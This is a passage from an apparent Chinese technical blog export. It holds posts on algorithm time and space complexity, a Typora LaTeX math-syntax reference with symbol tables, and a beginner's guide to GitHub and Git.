时间复杂度T(n)：（通常使用<strong>时间复杂度渐进上界</strong><code>O(f(n))</code>来表示时间复杂度）<br>​        算法运行需要的时间，一般将算法的执行次数作为时间复杂度的度量标准。（不是每个算法都能计算运行次数-最好情况，最坏情况，等）<br><strong>常见的算法时间复杂度类型</strong>：<br>（1）<strong>常熟阶</strong>：算法运行的次数是一个常数<br>（2）<strong>多项式阶</strong>：算法运行的次数是一个多项式<br>（3）<strong>指数阶</strong>：算法运行的次数是一个指数（效率极差）<br>（4）<strong>对数阶</strong>：算法运行的次数是一个对数<br>比较：<br><code>O(1)&lt;O(logn)&lt;O(n)&lt;O(nlogn)&lt;O(n^2)&lt;O(n^3)&lt;O(2^n)&lt;O(n!)&lt;O(n^n)</code></p><h1 id="空间复杂度"><a href="#空间复杂度" class="headerlink" title="空间复杂度"></a>空间复杂度</h1><p>​        算法占用的空间大小，一般将算法的<strong>辅助空间</strong>作为衡量算法空间复杂度的标准。<br>空间复杂度的本意是指算法在运行过程中占用的了多少存储空间，算法占用的存储空间包括：<br>（1）输入/输出数据<br>（2）算法本身所需的存储空间<br>（3）额外需要的辅助空间（是衡量算法空间复杂度的关键因素）<br>注：<br>​        递归算法中每一次递推需要一个栈空间来保存调用记录，因此，空间复杂度需要计算递归栈的辅助空间。<br>​        阶乘是典型的递归调用问题，递归包括递推和回归。递推是将原问题不断分解成子问题，直到达到结束条件，返回最近子问题的解，然后逆向逐一回归，最终达到递推开始的原问题，返回原问题的解。</p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在Typora编辑数学表达式</title>
      <link href="/2020/09/02/zai-typora-bian-ji-shu-xue-biao-da-shi/"/>
      <url>/2020/09/02/zai-typora-bian-ji-shu-xue-biao-da-shi/</url>
      
        <content type="html"><![CDATA[<h1 id="编辑器简述"><a href="#编辑器简述" class="headerlink" title="编辑器简述"></a>编辑器简述</h1><p>​        Typora是一款免费的Markdown编辑器，其主要特点为所见即所得。Typora内嵌LaTex数学表达式语法，即在Typora中可以通过LaTex语法来编辑数学表达式。</p><h1 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h1><p>​        <code>$</code>是编辑数学表达式的重要符号。被<code>$</code>包裹的语句会按LaTex语法解析成数学表达式形式展示。</p><ul><li><p>行内表达式写在<code>$...$</code>之间，行间表达式写在<code>$$...$$</code>之间</p></li><li><p>如果要在同一行输入多个公式，只需要在公式之间加上<code>\(空格)</code>或者<code>\quad</code></p></li><li><p>如果要输入多行公式，只需要在上一行公式的末尾加上<code>\\</code></p></li></ul><h2 id="公式模块打开姿势"><a href="#公式模块打开姿势" class="headerlink" title="公式模块打开姿势"></a>公式模块打开姿势</h2><ul><li><strong>点击</strong>【段落】–&gt; 【公式块】</li><li><strong>快捷键</strong>：<font color="red">Ctrl + Shift + M</font></li><li><strong>代码模式</strong>：<code>$$</code>+ 回车</li></ul><p>数学表达式编辑栏，如下所示：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/Typora-mathx/数学表达式编辑栏.png" alt="数学表达式编辑栏"></center><h1 id="常用表达式"><a href="#常用表达式" class="headerlink" title="常用表达式"></a>常用表达式</h1><h2 id="上-下标"><a href="#上-下标" class="headerlink" title="上/下标"></a>上/下标</h2><table><thead><tr><th align="center">表达式</th><th align="center">LaTex语法</th></tr></thead><tbody><tr><td align="center">$x^2$</td><td align="center"><code>$x^2$</code></td></tr><tr><td align="center">$x_2$</td><td align="center"><code>$x_2$</code></td></tr></tbody></table><h2 id="分式"><a href="#分式" class="headerlink" title="分式"></a>分式</h2><table><thead><tr><th align="center">表达式</th><th align="center">LaTex语法</th></tr></thead><tbody><tr><td align="center">$1/2$</td><td align="center"><code>$1/2$</code></td></tr><tr><td align="center">$\frac{a+1}{b+2}$</td><td align="center"><code>$\frac{a+1}{b+2}$</code></td></tr><tr><td align="center">${a+1}\over{b+2}$</td><td align="center"><code>${a+1}\over{b+2}$</code></td></tr><tr><td align="center">$\frac ab$</td><td align="center"><code>$\frac ab$</code></td></tr></tbody></table><h2 id="均值"><a href="#均值" class="headerlink" title="均值"></a>均值</h2><table><thead><tr><th align="center">表达式</th><th align="center">LaTex语法</th></tr></thead><tbody><tr><td align="center">$\overline{x}$</td><td align="center"><code>$\overline{x}$</code></td></tr></tbody></table><h2 id="开方"><a href="#开方" class="headerlink" title="开方"></a>开方</h2><table><thead><tr><th align="center">表达式</th><th align="center">LaTex语法</th></tr></thead><tbody><tr><td align="center">$\sqrt{x}$</td><td align="center"><code>$\sqrt{x}$</code></td></tr><tr><td align="center">$\sqrt[n]{x}$</td><td align="center"><code>$\sqrt[n]{x}$</code></td></tr><tr><td align="center">${x}^{\frac 12}$</td><td align="center"><code>${x}^{\frac 12}$</code></td></tr></tbody></table><h2 id="矢量"><a href="#矢量" class="headerlink" title="矢量"></a>矢量</h2><table><thead><tr><th align="center">表达式</th><th align="center">LaTex语法</th></tr></thead><tbody><tr><td align="center">$\vec{a}$</td><td align="center"><code>$\vec{a}$</code></td></tr></tbody></table><h2 id="积分"><a href="#积分" class="headerlink" title="积分"></a>积分</h2><table><thead><tr><th align="center">表达式</th><th align="center">LaTex语法</th></tr></thead><tbody><tr><td align="center">$\int{x}dx$</td><td align="center"><code>$\int{x}dx$</code></td></tr><tr><td align="center">$\int_0^1{x}dx$</td><td align="center"><code>$\int_0^1{x}dx$</code></td></tr><tr><td align="center">$\iint xdx$</td><td align="center"><code>$\iint xdx$</code></td></tr><tr><td align="center">$\iiint xdx$</td><td align="center"><code>$\iiint xdx$</code></td></tr><tr><td align="center">$\idotsint xdx$</td><td align="center"><code>$\idotsint xdx$</code></td></tr></tbody></table><h2 id="极限"><a href="#极限" class="headerlink" title="极限"></a>极限</h2><table><thead><tr><th align="center">表达式</th><th align="center">LaTex语法</th></tr></thead><tbody><tr><td align="center">$lim n$</td><td align="center"><code>$lim n$</code></td></tr><tr><td align="center">$\lim_{n\to+\infty} n$</td><td align="center"><code>$\lim_{n\to+\infty} n$</code></td></tr></tbody></table><h2 id="累加"><a href="#累加" class="headerlink" title="累加"></a>累加</h2><table><thead><tr><th align="center">表达式</th><th align="center">LaTex语法</th></tr></thead><tbody><tr><td align="center">$\sum{a}$</td><td align="center"><code>$\sum{a}$</code></td></tr><tr><td align="center">$\sum_{n=1}^{100}{a_n}$</td><td align="center"><code>$\sum_{n=1}^{100}{a_n}$</code></td></tr></tbody></table><h2 id="阶乘"><a href="#阶乘" class="headerlink" title="阶乘"></a>阶乘</h2><table><thead><tr><th align="center">表达式</th><th align="center">LaTex语法</th></tr></thead><tbody><tr><td align="center">$\prod x$</td><td align="center"><code>$\prod x$</code></td></tr><tr><td align="center">$\prod _{n=1} ^{100} x_n$</td><td align="center"><code>$\prod _{n=1} ^{100} x_n$</code></td></tr></tbody></table><h2 id="三角函数"><a href="#三角函数" class="headerlink" title="三角函数"></a>三角函数</h2><table><thead><tr><th align="center">表达式</th><th align="center">LaTex语法</th></tr></thead><tbody><tr><td align="center">$\sin x$</td><td align="center"><code>$\sin x$</code></td></tr><tr><td align="center">$\cos x$</td><td align="center"><code>$\cos x$</code></td></tr><tr><td align="center">$\tan x$</td><td align="center"><code>$\tan x$</code></td></tr><tr><td align="center">$\cot x$</td><td align="center"><code>$\cot x$</code></td></tr><tr><td align="center">$\sec x$</td><td align="center"><code>$\sec x$</code></td></tr><tr><td align="center">$\csc x$</td><td align="center"><code>$\csc x$</code></td></tr></tbody></table><h2 id="反三角函数"><a href="#反三角函数" class="headerlink" title="反三角函数"></a>反三角函数</h2><table><thead><tr><th align="center">表达式</th><th align="center">LaTex语法</th></tr></thead><tbody><tr><td align="center">$\arcsin x$</td><td align="center"><code>$\arcsin x$</code></td></tr><tr><td align="center">$\arccos x$</td><td align="center"><code>$\arccos x$</code></td></tr><tr><td align="center">$\arctan x$</td><td align="center"><code>$\arctan x$</code></td></tr></tbody></table><h2 id="对数"><a href="#对数" class="headerlink" title="对数"></a>对数</h2><table><thead><tr><th align="center">表达式</th><th align="center">LaTex语法</th></tr></thead><tbody><tr><td align="center">$\ln 2$</td><td align="center"><code>$\ln 2$</code></td></tr><tr><td align="center">$\log _2{8}$</td><td align="center"><code>$\log _2{8}$</code></td></tr><tr><td align="center">$\lg8$</td><td align="center"><code>$\lg8$</code></td></tr></tbody></table><h2 id="省略号"><a href="#省略号" class="headerlink" title="省略号"></a>省略号</h2><table><thead><tr><th align="center">表达式</th><th align="center">LaTex语法</th></tr></thead><tbody><tr><td align="center">$\cdots$</td><td align="center"><code>$\cdots$</code></td></tr></tbody></table><h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><table><thead><tr><th align="center">运算符</th><th align="center">LaTex语法</th></tr></thead><tbody><tr><td align="center">$\pm$</td><td align="center"><code>$\pm$</code></td></tr><tr><td align="center">$\times$</td><td align="center"><code>$\times$</code></td></tr><tr><td align="center">$\cdot$</td><td align="center"><code>$\cdot$</code></td></tr><tr><td align="center">$\div$</td><td align="center"><code>$\div$</code></td></tr><tr><td align="center">$\neq$</td><td align="center"><code>$\neq$</code></td></tr><tr><td align="center">$\equiv$</td><td align="center"><code>$\equiv$</code></td></tr><tr><td align="center">$\lt$</td><td align="center"><code>$\lt$</code></td></tr><tr><td align="center">$\gt$</td><td align="center"><code>$\gt$</code></td></tr><tr><td align="center">$\leqslant$</td><td align="center"><code>$\leqslant$</code></td></tr><tr><td align="center">$\geqslant$</td><td align="center"><code>$\geqslant$</code></td></tr><tr><td align="center">$\leq$</td><td align="center"><code>$\leq$</code></td></tr><tr><td align="center">$\geq$</td><td align="center"><code>$\geq$</code></td></tr><tr><td align="center">$\le$</td><td align="center"><code>$\le$</code></td></tr><tr><td align="center">$\ge$</td><td align="center"><code>$\ge$</code></td></tr><tr><td align="center">$\leqq$</td><td align="center"><code>$\leqq$</code></td></tr><tr><td align="center">$\geqq$</td><td align="center"><code>$\geqq$</code></td></tr><tr><td align="center">$\land$</td><td align="center"><code>$\land$</code></td></tr><tr><td align="center">$\lor$</td><td align="center"><code>$\lor$</code></td></tr><tr><td align="center">$\lnot$</td><td align="center"><code>$\lnot$</code></td></tr><tr><td align="center">$\to$</td><td align="center"><code>$\to$</code></td></tr><tr><td align="center">$\rightarrow$</td><td align="center"><code>$\rightarrow$</code></td></tr><tr><td align="center">$\leftarrow$</td><td align="center"><code>$\leftarrow$</code></td></tr><tr><td align="center">$\leftrightarrow$</td><td align="center"><code>$\leftrightarrow$</code></td></tr><tr><td align="center">$\Rightarrow$</td><td align="center"><code>$\Rightarrow$</code></td></tr><tr><td align="center">$\Leftarrow$</td><td align="center"><code>$\Leftarrow$</code></td></tr><tr><td align="center">$\Leftrightarrow$</td><td align="center"><code>$\Leftrightarrow$</code></td></tr><tr><td align="center">$\top$</td><td align="center"><code>$\top$</code></td></tr><tr><td align="center">$\bot$</td><td align="center"><code>$\bot$</code></td></tr><tr><td align="center">$\vdash$</td><td align="center"><code>$\vdash$</code></td></tr><tr><td align="center">$\vDash$</td><td align="center"><code>$\vDash$</code></td></tr><tr><td align="center">$\subset$</td><td align="center"><code>$\subset$</code></td></tr><tr><td align="center">$\subseteq$</td><td align="center"><code>$\subseteq$</code></td></tr><tr><td align="center">$\subsetneq$</td><td align="center"><code>$\subsetneq$</code></td></tr><tr><td align="center">$\in$</td><td align="center"><code>$\in$</code></td></tr><tr><td align="center">$\notin$</td><td align="center"><code>$\notin$</code></td></tr><tr><td align="center">$\cup$</td><td align="center"><code>$\cup$</code></td></tr><tr><td align="center">$\cap$</td><td align="center"><code>$\cap$</code></td></tr><tr><td align="center">$\mathbb{R}$</td><td align="center"><code>$\mathbb{R}$</code></td></tr><tr><td align="center">$\mathbb{Q}$</td><td align="center"><code>$\mathbb{Q}$</code></td></tr><tr><td align="center">$\mathbb{Z}$</td><td align="center"><code>$\mathbb{Z}$</code></td></tr><tr><td align="center">$\mathbb{N}$</td><td align="center"><code>$\mathbb{N}$</code></td></tr></tbody></table><h2 id="括号"><a href="#括号" class="headerlink" title="括号"></a>括号</h2><table><thead><tr><th align="center">括号</th><th align="center">LaTex语法</th></tr></thead><tbody><tr><td align="center">$(x)$</td><td align="center"><code>$(x)$</code></td></tr><tr><td align="center">$[x]$</td><td align="center"><code>$[x]$</code></td></tr><tr><td align="center">$\{ x \}$</td><td align="center"><code>$\{ x \}$</code></td></tr><tr><td align="center">$</td><td align="center">x</td></tr><tr><td align="center">$\vert x \vert$</td><td align="center"><code>$\vert x \vert$</code></td></tr><tr><td align="center">$\Vert x \Vert$</td><td align="center"><code>$\Vert x \Vert$</code></td></tr><tr><td align="center">$\langle x \rangle$</td><td align="center"><code>$\langle x \rangle$</code></td></tr><tr><td align="center">$\lceil x \rceil$</td><td align="center"><code>$\lceil x \rceil$</code></td></tr><tr><td align="center">$\lfloor x \rfloor$</td><td align="center"><code>$\lfloor x \rfloor$</code></td></tr><tr><td align="center">$\left\lbrace\frac12\right\rbrace$</td><td align="center"><code>$\left\lbrace\frac12\right\rbrace$</code></td></tr><tr><td align="center">$\Biggl(\biggl(\Bigl(\bigl((x)\bigr)\Bigr)\biggr)\Biggr)$</td><td align="center"><code>\Biggl(\biggl(\Bigl(\bigl((x)\bigr)\Bigr)\biggr)\Biggr)</code></td></tr></tbody></table><h2 id="其他特殊字符"><a href="#其他特殊字符" class="headerlink" title="其他特殊字符"></a>其他特殊字符</h2><table><thead><tr><th align="center">符号</th><th align="center">LaTex语法</th></tr></thead><tbody><tr><td align="center">$\forall$</td><td align="center"><code>$\forall$</code></td></tr><tr><td align="center">$\exists$</td><td align="center"><code>$\exists$</code></td></tr><tr><td align="center">$\infty$</td><td align="center"><code>$\infty$</code></td></tr><tr><td align="center">$\emptyset$</td><td align="center"><code>$\emptyset$</code></td></tr><tr><td align="center">$\varnothing$</td><td align="center"><code>$\varnothing$</code></td></tr><tr><td align="center">$\nabla$</td><td align="center"><code>$\nabla$</code></td></tr><tr><td align="center">$\angle$</td><td align="center"><code>$\angle$</code></td></tr><tr><td align="center">$\because$</td><td align="center"><code>$\because$</code></td></tr><tr><td align="center">$\therefore$</td><td align="center"><code>$\therefore$</code></td></tr><tr><td align="center">$\vdash$</td><td align="center"><code>$\vdash$</code></td></tr><tr><td align="center">$\vDash$</td><td align="center"><code>$\vDash$</code></td></tr><tr><td align="center">$\nvDash$</td><td align="center"><code>$\nvDash$</code></td></tr></tbody></table><h2 id="希腊字母"><a href="#希腊字母" class="headerlink" title="希腊字母"></a>希腊字母</h2><table><thead><tr><th align="center">大写</th><th align="center">LaTex语法</th><th align="center">小写</th><th align="center">LaTex语法</th></tr></thead><tbody><tr><td align="center">$\Alpha$</td><td align="center"><code>$\Alpha$</code></td><td align="center">$\alpha$</td><td align="center"><code>$\alpha$</code></td></tr><tr><td align="center">$\Beta$</td><td align="center"><code>$\Beta$</code></td><td align="center">$\beta$</td><td align="center"><code>$\beta$</code></td></tr><tr><td align="center">$\Gamma$</td><td align="center"><code>$\Gamma$</code></td><td align="center">$\gamma$</td><td align="center"><code>$\gamma$</code></td></tr><tr><td align="center">$\Delta$</td><td align="center"><code>$\Delta$</code></td><td align="center">$\delta$</td><td align="center"><code>$\delta$</code></td></tr><tr><td align="center">$\Epsilon$</td><td align="center"><code>$\Epsilon$</code></td><td align="center">$\epsilon$</td><td align="center"><code>$\epsilon$</code></td></tr><tr><td align="center"></td><td align="center"></td><td align="center">$\varepsilon$</td><td align="center"><code>$\varepsilon$</code></td></tr><tr><td align="center">$\Zeta$</td><td align="center"><code>$\Zeta$</code></td><td align="center">$\zeta$</td><td align="center"><code>$\zeta$</code></td></tr><tr><td align="center">$\Eta$</td><td align="center"><code>$\Eta$</code></td><td align="center">$\eta$</td><td align="center"><code>$\eta$</code></td></tr><tr><td align="center">$\Theta$</td><td align="center"><code>$\Theta$</code></td><td align="center">$\theta$</td><td align="center"><code>$\theta$</code></td></tr><tr><td align="center">$\Iota$</td><td align="center"><code>$\Iota$</code></td><td align="center">$\iota$</td><td align="center"><code>$\iota$</code></td></tr><tr><td align="center">$\Kappa$</td><td align="center"><code>$\Kappa$</code></td><td align="center">$\kappa$</td><td align="center"><code>$\kappa$</code></td></tr><tr><td align="center">$\Lambda$</td><td align="center"><code>$\lambda$</code></td><td align="center">$\lambda$</td><td align="center"><code>$\lambda$</code></td></tr><tr><td align="center">$\Mu$</td><td align="center"><code>$\Mu$</code></td><td align="center">$\mu$</td><td align="center"><code>$\mu$</code></td></tr><tr><td align="center">$\Nu$</td><td align="center"><code>$\Nu$</code></td><td align="center">$\nu$</td><td align="center"><code>$\nu$</code></td></tr><tr><td align="center">$\Xi$</td><td align="center"><code>$\Xi$</code></td><td align="center">$\xi$</td><td align="center"><code>$\xi$</code></td></tr><tr><td align="center">$\Omicron$</td><td align="center"><code>$\Omicron$</code></td><td align="center">$\omicron$</td><td align="center"><code>$\omicron$</code></td></tr><tr><td align="center">$\Pi$</td><td align="center"><code>$\Pi$</code></td><td align="center">$\pi$</td><td align="center"><code>$\pi$</code></td></tr><tr><td align="center">$\Rho$</td><td align="center"><code>$\Rho$</code></td><td align="center">$\rho$</td><td align="center"><code>$\rho$</code></td></tr><tr><td align="center">$\Sigma$</td><td align="center"><code>$\Sigma$</code></td><td align="center">$\sigma$</td><td align="center"><code>$\sigma$</code></td></tr><tr><td align="center">$\Tau$</td><td align="center"><code>$\Tau$</code></td><td align="center">$\tau$</td><td align="center"><code>$\tau$</code></td></tr><tr><td align="center">$\Upsilon$</td><td align="center"><code>$\Upsilon$</code></td><td align="center">$\upsilon$</td><td align="center"><code>$\upsilon$</code></td></tr><tr><td align="center">$\Phi$</td><td align="center"><code>$\Phi$</code></td><td align="center">$\phi$</td><td align="center"><code>$\phi$</code></td></tr><tr><td align="center"></td><td align="center"></td><td align="center">$\varphi$</td><td align="center"><code>$\varphi$</code></td></tr><tr><td align="center">$\Chi$</td><td align="center"><code>$\Chi$</code></td><td align="center">$\chi$</td><td align="center"><code>$\chi$</code></td></tr><tr><td align="center">$\Psi$</td><td align="center"><code>$\Psi$</code></td><td align="center">$\psi$</td><td align="center"><code>$\psi$</code></td></tr><tr><td align="center">$\Omega$</td><td align="center"><code>$\Omega$</code></td><td align="center">$\omega$</td><td align="center"><code>$\omega$</code></td></tr></tbody></table><h1 id="常用公式"><a href="#常用公式" class="headerlink" title="常用公式"></a>常用公式</h1><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="一元函数"><a href="#一元函数" class="headerlink" title="一元函数"></a>一元函数</h3><p>eg1:<br>$$<br>y = x \ \ (x \subset \mathbb{R})<br>$$<br>eg2:<br>$$<br>y = x^2 \ \ (x \subset \mathbb{R})<br>$$<br>eg3:<br>$$<br>y = |x| \ \ (x \subset \mathbb{R})<br>$$</p><h3 id="多元函数"><a href="#多元函数" class="headerlink" title="多元函数"></a>多元函数</h3><p>eg1:<br>$$<br>y = a + b \ \ (a \subset \mathbb{R},b \subset \mathbb{R})<br>$$<br>eg2:<br>$$<br>y = 2a^2 + b^2 \ \ (a \subset \mathbb{R},b \subset \mathbb{R})<br>$$<br>eg3:<br>$$<br>y = |a| - 2b \ \ (a \subset \mathbb{R},b \subset \mathbb{R})<br>$$</p><h3 id="三角函数-1"><a href="#三角函数-1" class="headerlink" title="三角函数"></a>三角函数</h3><p>eg1:<br>$$<br>y = \sin x \ + \ \frac{\pi}{6} \ \ ( -\pi \leq x \leq \pi )<br>$$<br>eg2:<br>$$<br>y = \cos(x + \frac{\pi}{6}) \ \ ( -\pi \leq x \leq \pi )<br>$$</p><h3 id="分段函数"><a href="#分段函数" class="headerlink" title="分段函数"></a>分段函数</h3><p>eg1:<br>$$<br>f(x)=<br>\begin{cases}<br>1 &amp; x \geq 0 \<br>0 &amp; x &lt; 0<br>\end{cases}<br>$$<br>eg2:<br>$$<br>c(u)=<br>\begin{cases}<br>\sqrt\frac{1}{N}，u = 0 \\<br>\sqrt\frac{2}{N}，u \neq 0<br>\end{cases}<br>$$</p><h2 id="等式"><a href="#等式" class="headerlink" title="等式"></a>等式</h2><p>eg1:<br>$$<br>1 + 1 = 2<br>$$<br>eg2:<br>$$<br>1 \div 2 = \frac{1}{2} = 0.5<br>$$</p><p>eg3:</p><p>eg4:<br>$$<br>\sum_{i=0}^n i^2 = \frac{(n^2+n)(2n+1)}{6}<br>$$<br>eg5:<br>$$<br>e^{i\pi} + 1 = 0<br>$$</p><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p>参考链接：</p><p><a href="https://blog.csdn.net/Ernest_YN/article/details/84064233#31__195" target="_blank" rel="noopener">如何用在Typora中添加数学公式?</a></p><p><a href="https://math.meta.stackexchange.com/questions/5020/mathjax-basic-tutorial-and-quick-reference/5044%20MathJax%20basic%20tutorial%20and%20quick%20reference" target="_blank" rel="noopener">MathJax basic tutorial and quick reference</a></p>]]></content>
      
      
      <categories>
          
          <category> 软件使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Markdown </tag>
            
            <tag> Typora </tag>
            
            <tag> 数学表达式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git和GitHub</title>
      <link href="/2020/09/02/git-he-github/"/>
      <url>/2020/09/02/git-he-github/</url>
      
        <content type="html"><![CDATA[<h1 id="使用GitHub"><a href="#使用GitHub" class="headerlink" title="使用GitHub"></a>使用GitHub</h1><h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>​        借助GitHub托管项目代码</p><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><h3 id="仓库（Repository）"><a href="#仓库（Repository）" class="headerlink" title="仓库（Repository）"></a>仓库（Repository）</h3><p>​        仓库即你的项目，你想在Github上开源一个项目，那就必须新建一个Repository，如果你的开源项目多了，你就拥有多个Repositories。</p><h3 id="收藏（Star）"><a href="#收藏（Star）" class="headerlink" title="收藏（Star）"></a>收藏（Star）</h3><p>​        star意为收藏项目的人数，收藏项目方便再次查看，在GitHub上如果你有一个项目获得100个star都算很不容易了！</p><h3 id="复制克隆项目（Fork）"><a href="#复制克隆项目（Fork）" class="headerlink" title="复制克隆项目（Fork）"></a>复制克隆项目（Fork）</h3><p>​        你开源了一个项目，别人想在你这个项目的基础上做一些改进，然后应用到自己的项目中，这个时候他就可以Fork你的项目，然后他的Github主页上就多了一个项目，只不过这个项目是基于你的项目基础（<strong>本质上是在原有项目的基础上新建了一个分支</strong>），他就可以随心所欲的去改进，但是丝毫不会影响原有项目的代码与结构。</p><h3 id="发起请求（Pull-Request）"><a href="#发起请求（Pull-Request）" class="headerlink" title="发起请求（Pull Request）"></a><strong>发起请求（Pull Request）</strong></h3><p>​        发起请求，这个其实是基于Fork的。如果别人在你的基础上做了改进，后来觉得改进不错，应该要把这些改进让更多人收益，于是就像把他的改进合并到原有项目里，这个时候他就可以发起一个Pull  Request（简称PR），原有项目的创建人，就可以收到这个请求，这个时候创建人会仔细review他的代码，并且测试觉得OK，就会接受他的PR，这个时候他做的改进原有项目就会拥有。</p><h3 id="关注（Watch）"><a href="#关注（Watch）" class="headerlink" title="关注（Watch）"></a><strong>关注（Watch）</strong></h3><p>​        如果你Watch了某个项目，那么以后只要这个项目有任何更新，你都会第一时间收到关于这个项目的通知提醒。</p><h3 id="事务卡片（Issue）"><a href="#事务卡片（Issue）" class="headerlink" title="事务卡片（Issue）"></a><strong>事务卡片（Issue）</strong></h3><p>​        发现代码Bug，但是目前没有成型代码，需要讨论时用。你开源了一个项目，别人发现你的项目中有bug，后者哪些地方做的不够好，他就可以给你提一个Issue，即问题，提的问题多了，也就是Issues，然后你看到了这些问题就可以逐个去修复，修复OK了就可以一个一个的close掉。</p><h3 id="Github主页"><a href="#Github主页" class="headerlink" title="Github主页"></a><strong>Github主页</strong></h3><p>​        账号创建成功或点击网址导航栏GitHub图标即可进入GitHub主页，该主页左侧主要显示用户动态以及关注用户或关注仓库的动态，右侧显示所有Git库。</p><h3 id="仓库主页"><a href="#仓库主页" class="headerlink" title="仓库主页"></a><strong>仓库主页</strong></h3><p>​        仓库主页主要显示项目的信息，如：项目代码、版本、收藏/关注/Fork等情况。</p><h3 id="个人主页"><a href="#个人主页" class="headerlink" title="个人主页"></a><strong>个人主页</strong></h3><p>​        个人信息：头像、个人简介、关注我的人、我关注的人、我关注的Git库、我的开源项目、我贡献的开源项目等信息</p><h2 id="注册GitHub账号"><a href="#注册GitHub账号" class="headerlink" title="注册GitHub账号"></a>注册GitHub账号</h2><h3 id="官方网址"><a href="#官方网址" class="headerlink" title="官方网址"></a>官方网址</h3><p><a href="https://github.com/" target="_blank" rel="noopener">GitHub</a></p><h3 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h3><p><strong>GitHub主界面</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/Git/GitHub主页界面(en).png" alt="GitHub主页界面(en)"></center><p><strong>GitHub注册界面</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/Git/GitHub注册界面.png" alt="GitHub注册界面"></center><p><strong>注册成功后进入GitHub主界面</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/Git/注册成功后进入GitHub主界面.png" alt="注册成功后进入GitHub主界面"></center><p>注：</p><ul><li>因为GitHub在国外服务器所以访问较慢或者无法访问，需要翻墙（Shadowsocks）</li><li>私有仓库只能自己或者指定的朋友才有权限操作（私有仓库的收费的）</li><li>新注册的用户<strong>必须验证邮箱</strong>后才可以创建Git库仓库</li></ul><h2 id="创建仓库-创建新项目"><a href="#创建仓库-创建新项目" class="headerlink" title="创建仓库/创建新项目"></a>创建仓库/创建新项目</h2><p>​        <font color="red">创建仓库/闯进啊新项目之前必须认证邮箱</font></p><p>新建仓库</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/Git/新建仓库.png" alt="新建仓库"></center><p>仓库主页</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/Git/仓库主页.png" alt="仓库主页"></center><h2 id="仓库管理"><a href="#仓库管理" class="headerlink" title="仓库管理"></a>仓库管理</h2><h3 id="创建文件"><a href="#创建文件" class="headerlink" title="创建文件"></a>创建文件</h3><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/Git/创建新文件.png" alt="创建新文件"></center><p>创建新文件后跳转至test仓库主页</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/Git/创建新文件后跳转值test仓库主页.png" alt="创建新文件后跳转值test仓库主页"></center><h3 id="修改文件"><a href="#修改文件" class="headerlink" title="修改文件"></a>修改文件</h3><p>在仓库中点击要修改的文件名后进入文件详情页面</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/Git/修改文件-文件详情页.png" alt="修改文件-文件详情页"></center><p>点击文件详情页中的触笔后，进入修改文件页，在其中对文件内容进行修改后，需提交修改信息</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/Git/修改文件-修改文件内容页.png" alt="修改文件-修改文件内容页"></center><h3 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a>删除文件</h3><p>在仓库主页中点击文件名进入文件详情页，点击删除图标</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/Git/删除文件-文件详情页.png" alt="删除文件-文件详情页"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/Git/删除文件-删除描述.png" alt="删除文件-删除描述"></center><h3 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h3><p>在仓库主页点击上传文件按钮</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/Git/上传文件-仓库主页.png" alt="上传文件-仓库主页"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/Git/上传文件-上传文件编辑页.png" alt="上传文件-上传文件编辑页"></center><h3 id="搜索文件"><a href="#搜索文件" class="headerlink" title="搜索文件"></a>搜索文件</h3><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/Git/搜索文件.png" alt="搜索文件"></center><h3 id="下载-检出项目"><a href="#下载-检出项目" class="headerlink" title="下载/检出项目"></a>下载/检出项目</h3><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/Git/下载项目.png" alt="下载项目"></center><h2 id="GitHub-Issues"><a href="#GitHub-Issues" class="headerlink" title="GitHub Issues"></a>GitHub Issues</h2><p>作用：发现代码Bug，但是目前没有成型代码，需要讨论时用；或者使用开源项目出现问题时使用</p><h3 id="新建Issue"><a href="#新建Issue" class="headerlink" title="新建Issue"></a>新建Issue</h3><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/Git/Issue.png" alt="Issue"></center><h3 id="提交-关闭Issue"><a href="#提交-关闭Issue" class="headerlink" title="提交/关闭Issue"></a>提交/关闭Issue</h3><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/Git/Issue-提交或关闭.png" alt="Issue-提交或关闭"></center><h1 id="使用Git"><a href="#使用Git" class="headerlink" title="使用Git"></a>使用Git</h1><h2 id="Git基本工作流程"><a href="#Git基本工作流程" class="headerlink" title="Git基本工作流程"></a>Git基本工作流程</h2><h3 id="Git工作区"><a href="#Git工作区" class="headerlink" title="Git工作区"></a>Git工作区</h3><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/Git/Git工作区.png" 